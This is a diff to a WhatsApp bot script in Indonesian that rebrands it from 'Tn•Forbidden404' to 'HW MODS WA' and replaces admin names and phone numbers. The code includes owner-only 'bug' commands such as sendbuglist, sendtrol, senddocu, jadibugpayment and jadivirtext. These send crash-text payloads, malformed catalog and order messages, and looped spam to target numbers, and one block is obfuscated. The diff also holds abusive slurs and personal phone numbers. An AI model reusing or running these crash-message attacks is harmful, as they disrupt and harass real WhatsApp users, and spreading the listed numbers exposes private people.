 case 'listlogo':
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `LOGO 1`, rowId: `${prefix}hw1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -4044,7 +4046,7 @@ break
 case 'listjualan': case 'jualan': {
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔏 PANEL AMGEEKZ`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `}, 
@@ -4062,7 +4064,7 @@ break
 case 'apkamgeekz': {
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔏 APK AMGEEKZ`, rowId: `${prefix}amgeekzcoy`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `}
@@ -4076,7 +4078,7 @@ break
 case 'layanan':{
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔏 LARANGAN GROUP`, rowId: `${prefix}larangan`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `}, 
@@ -4098,7 +4100,7 @@ break
 case 'payment':{
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `DANA`, rowId: `${prefix}pdana`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `}, 
@@ -4124,7 +4126,7 @@ break
 case 'listwibu':
 touchmebree = [
 {
-title: `©️Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -4181,7 +4183,7 @@ case 'listban':
 if (!isCreator) return m.reply(mess.owner)
 touchmebree = [
 {
-title: `©️Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -4328,12 +4330,12 @@ let sections = [
 {
 title: "CHANGE MENU BOT",
 rows: [
-{title: "RobotKuPintar ONLINE ✅", rowId: `${prefix}setadmin inod`, description: `ONLINE`},
-{title: "B0B ONLINE ✅", rowId: `${prefix}setadmin sura`, description: `ONLINE`},
-{title: "RobotKuPintar MODS ✅", rowId: `${prefix}setadmin hwmods`, description: `ONLINE`},
-{title: "B0B ✅", rowId: `${prefix}setadmin inod1`, description: `ONLINE`},
-{title: "RobotKuPintar ✅", rowId: `${prefix}setadmin RobotKuPintar1`, description: `ONLINE`},
-{title: "RobotKuPintar ✅", rowId: `${prefix}setadmin sura1`, description: `ONLINE`},
+{title: "INOD ONLINE ✅", rowId: `${prefix}setadmin inod`, description: `ONLINE`},
+{title: "SURA ONLINE ✅", rowId: `${prefix}setadmin sura`, description: `ONLINE`},
+{title: "HW MODS ✅", rowId: `${prefix}setadmin hwmods`, description: `ONLINE`},
+{title: "SURA X HW ✅", rowId: `${prefix}setadmin inod1`, description: `ONLINE`},
+{title: "INOD X HW ✅", rowId: `${prefix}setadmin hwmods1`, description: `ONLINE`},
+{title: "INOD X SURA ✅", rowId: `${prefix}setadmin sura1`, description: `ONLINE`},
 {title: "ADMIN ONLINE ✅", rowId: `${prefix}setadmin onkabeh`, description: `SEMUA ONLINE`},
 {title: "ADMIN OFFLINE 🚫", rowId: `${prefix}setadmin offkabeh`, description: `OFFLINE SEMUA`},
 {title: "FULL SLOT 🔏", rowId: `${prefix}setadmin onkabeh1`, description: `SERVER PENUH`},
@@ -4351,109 +4353,138 @@ if (setbot.inod) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Online✅*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
+Nama	: Inod
+Kontak : 6285649455626
 
 ⚡Admin 2 - *Offline🚫*
-Nama	: B0B
-Kontak	: 6282278082114
+Nama	: Sura
+Kontak	: 62895422836123
+
+⚡Admin 3 - *Offline🚫*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.sura) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Offline🚫*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
+Nama	: Inod
+Kontak : 6285649455626
 
 ⚡Admin 2 - *Online✅*
-Nama	: B0B
-Kontak	: 6282278082114
+Nama	: Sura
+Kontak	: 62895422836123
 
+⚡Admin 3 - *Offline🚫*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.hwmods) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Offline🚫*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
+Nama	: Inod
+Kontak : 6285649455626
 
 ⚡Admin 2 - *Offline🚫*
-Nama	: B0B
-Kontak	: 6282278082114
+Nama	: Sura
+Kontak	: 62895422836123
+
+⚡Admin 3 - *Online✅*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.onkabeh) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Online✅*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
+Nama	: Inod
+Kontak : 6285649455626
 
 ⚡Admin 2 - *Online✅*
-Nama	: B0B
-Kontak	: 6282278082114
+Nama	: Sura
+Kontak	: 62895422836123
+
+⚡Admin 3 - *Online✅*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.offkabeh) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Offline🚫*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
-
+Nama	: Inod
+Kontak : 6285649455626
 
 ⚡Admin 2 - *Offline🚫*
-Nama	: B0B
-Kontak	: 6282278082114
+Nama	: Sura
+Kontak	: 62895422836123
+
+⚡Admin 3 - *Offline🚫*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.inod1) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Offline🚫*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
-
+Nama	: Inod
+Kontak : 6285649455626
 
 ⚡Admin 2 - *Online✅*
-Nama	: B0B
-Kontak	: 6282278082114
+Nama	: Sura
+Kontak	: 62895422836123
+
+⚡Admin 3 - *Online✅*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.hwmods1) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Online✅*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
+Nama	: Inod
+Kontak : 6285649455626
 
 ⚡Admin 2 - *Offline🚫*
-Nama	: B0B
-Kontak	: 6282278082114
+Nama	: Sura
+Kontak	: 62895422836123
+
+⚡Admin 3 - *Online✅*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.sura1) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :
 
 ⚡Admin 1 - *Online✅*
-Nama	: RobotKuPintar
-Kontak : 6285814480623
+Nama	: Inod
+Kontak : 6285649455626
 
-⚡Admin 2 - *Offline🚫*
-Nama	: B0B
-Kontak	: 6282278082114
+⚡Admin 2 - *Offline✅*
+Nama	: Sura
+Kontak	: 62895422836123
+
+⚡Admin 3 - *Online🚫*
+Nama	: Hw Mod
+Kontak : 6281214281312
 
 📮Note :
-*Hati Hati Admin Ganteng Hanya 2 Orang Diatas Gakk Puasa Suka Bawa Gorengan😎*` }, { quoted:m })
+*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
 } else if (setbot.onkabeh1) {
 haikal.sendMessage(from, { image: ppnyauser, caption: `*SERVER PENUH*` }, { quoted:m })
 } else if (setbot.offkabeh1) {
@@ -4486,7 +4517,7 @@ tekse = `「 Group Link Yang Di Inspect 」
 
 ▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}
 
-©By Tn•Forbidden404`
+©By HW MODS WA`
 try {
 pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
 } catch {
@@ -4599,7 +4630,7 @@ await sleep(2000)
 break
 case 'jaditroli': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 a = await haikal.sendMessage(from, {react: {  key: { remoteJid: from, fromMe: true, id : m.key.id}}})
@@ -4613,7 +4644,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${teks}`,
 "orderTitle": `${teks}`,
-"sellerJid": "6282278082114@s.whatsapp.net",
+"sellerJid": "6281214281312@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m })
@@ -4625,7 +4656,7 @@ break
 //=================================================//
 case 'jadilokas': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -4649,7 +4680,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (!quoted) throw 'Reply Image/sticker'
 let teks = `${q}`
 {
-function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6285814480623','397419wzTxRp','6285814480623@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
+function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
 sticSukses(from)
 }
 }
@@ -4657,7 +4688,7 @@ break
 //=================================================//
 case 'jadidocu': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -4682,7 +4713,7 @@ break
 //=================================================//
 case 'jadidarknes': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -4707,7 +4738,7 @@ break
 //=================================================//
 case 'jadivirtext1': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
@@ -4718,7 +4749,7 @@ break
 //=================================================//
 case 'jadivirtext2': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
@@ -4729,7 +4760,7 @@ break
 //=================================================//
 case 'jadivirtex3t': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
@@ -4740,7 +4771,7 @@ break
 //=================================================//
 case 'jadivirtext4': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
@@ -4751,7 +4782,7 @@ break
 //=================================================//
 case 'jadivirtext5': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
@@ -4762,7 +4793,7 @@ break
 //=================================================//
 case 'jadivirtext6': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
@@ -4773,7 +4804,7 @@ break
 //=================================================//
 case 'jadivirtext7': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
@@ -4784,7 +4815,7 @@ break
 //=================================================//
 case 'jadivirtext8': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
@@ -4795,7 +4826,7 @@ break
 //=================================================//
 case 'jadivirtext9': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command}Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
@@ -4806,7 +4837,7 @@ break
 //=================================================//
 case 'jadivirtext10': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command} Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
@@ -4817,7 +4848,7 @@ break
 //=================================================//
 case 'jadibuginvite': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command} Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -4839,11 +4870,11 @@ break
 //=================================================//
 case 'jadibugpayment' : {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command} Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 sticSukses(from)
 let teks = `${q}`
 {
-haikal.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER Tn•Forbidden404`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -4857,7 +4888,7 @@ break
 //=================================================//
 case 'jadibugsw': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command} Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 joau = fs.readFileSync('./baseikal/video/haikal.mp4')
@@ -4869,7 +4900,7 @@ break
 //=================================================//
 case 'jadibugbutton':
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command} Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 const buttonssk = [
@@ -4890,24 +4921,24 @@ sticSukses(from)
 //=================================================//
 case 'sendbuglist': case 'sendbuglist2': case 'sendbuglist3': case 'sendbuglist4': case 'sendbuglist5':
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 touchmebre = [
 {
-title: `🌷 Tn•Forbidden404 Mods 🌷 ${buttonvirus} ${buttonvirus}`,
+title: `🌷 HW MODS WA WA 🌷 ${buttonvirus} ${buttonvirus}`,
 rows: [
 {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
 {title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
 ]
 }
 ]
-haikal.sendListMsg(bnnd, `🌷 Tn•Forbidden404 Mods 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
+haikal.sendListMsg(bnnd, `🌷 HW MODS WA WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
 sticSukses(from)
 break
 //=================================================//
 case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
 var order = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -4917,9 +4948,9 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": " BY Tn•Forbidden404 ",
+"message": " BY HW MODS WA",
 "orderTitle": " BUG TROLI ", // 
-"sellerJid": "6285814480623@s.whatsapp.net",
+"sellerJid": "6281214281312@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -4930,7 +4961,7 @@ break
 //=================================================//
 case 'senddocu': case 'senddocu2': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
 if (!isCreator) return m.reply(mess.owner)
-if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = q.split("|")[0]+'@s.whatsapp.net'
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 "documentMessage": {
@@ -4957,7 +4988,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404 ${iphone}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -4968,7 +4999,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404 Mods${iphone1}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone1}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -4979,7 +5010,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404 ${iphone2}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone2}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -4990,7 +5021,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404 Mods${iphone3}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone3}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -5001,7 +5032,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone4}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone4}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -5012,7 +5043,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone5}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone5}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -5023,7 +5054,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone6}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone6}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -5034,7 +5065,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404${buttonkal}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${buttonkal}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -5045,7 +5076,7 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
